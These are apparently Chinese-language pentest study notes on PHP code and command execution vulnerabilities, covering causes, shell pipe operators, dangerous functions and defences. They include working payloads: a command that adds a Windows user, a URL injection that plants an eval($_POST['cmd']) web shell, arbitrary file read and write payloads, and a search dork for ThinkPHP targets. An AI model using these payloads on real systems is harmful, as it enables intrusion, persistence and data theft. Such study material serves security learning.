### 代码执行漏洞&&命令执行漏洞

```
危害比较大，有些漏洞可getshell
执行命令（代码和系统命令）
反弹shell
获取系统敏感信息

命令执行原因：
1、参数可控
2、使用了执行系统命令的函数 system、exec、shell_exec等等、将用户提交的参数去执行，中间过滤不严格

注意：执行的命令是系统命令，windows或者linux命令
```

### 分类：

```
1、web代码层命令执行
2、第三方组件命令执行漏洞
wordpres处理图片的imagemagick
心脏滴血漏洞  https sftp
java中命令注入漏洞（struts2/elasticsearchgroovy）
vBullrtin 5.x 版本通杀远程代码执行
3、系统层面命令执行漏洞
ms08-067
bash破壳漏洞
```

### 管道符

```
windows
|：直接执行后面的语句
||：如果前面的执行的语句出错，则执行后面的语句。
&：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假
&&：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。

linux:
；：执行完前面的语句再执行后面的。
|：显示后面语句的执行结果。
||：当前面的语句执行出错时，则直接执行后面的语句
&：如果前面的语句为假则直接执行后面的语句，前面的与可真可假
&&: 只有前面执行成功，才能执行后面语句
```

### 命令执行常用函数

```
1、反撇号 ``
echo `whoami`
2、system()
php -r "system('whoami');"
3、passthru()"
php -r "passthru('whoami');"
4、exec()
php -r "exec('whoami');"
php -r "passthru('net user te 123.com /add');"
5、shell_exec()
6、回调函数（用户自定义函数 系统函数）
7、popen()
8、proc_open()
9、pcntl_exec()

注意：通过站点中命令执行漏洞执行某些命令的权限是：依托于站点权限
```

### 代码执行

```
形成原因：
1、参数可控
2、过滤不严谨

php>=5.3 最外大括号可省略，如下
${phpinfo();}
其余
{${phpinfo();}}

php:eval assert preg_replace
asp:eval execute executeglobal
jsp:没有php中的eval,但是可以使用反射机制。使用基于反射机制的表达式引擎
0GNL SpEL MVEL等

thinkphp代码执行漏洞
inurl:thinkphp

http://127.0.0.1/code_exec.php?data={${eval($_POST["cmd"])}}

获取当前路径

读文件
http://127.0.0.1/code_exec.php?data={${exit(var_dump(file_get_contents($_POST['f'])))}}
post数据 f=具体文件路径
写文件
http://127.0.0.1/code_exec.php?data={${exit(var_dump(file_put_contents($_POST['f'],$_POST[d])))}}
```

### 代码执行漏洞防御

```
1、使用json保存数组，读取数据时不使用eval   //string2array
2、必须使用eval的地方要严格过滤（推荐使用白名单）
3、对特殊字符进行转义{
    addslashes、魔术引号、htmlspecialchars
    htmlentities、mysql_real_escape_string等
}
4、放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换
5、若使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象（preg_repalce+正则）
```































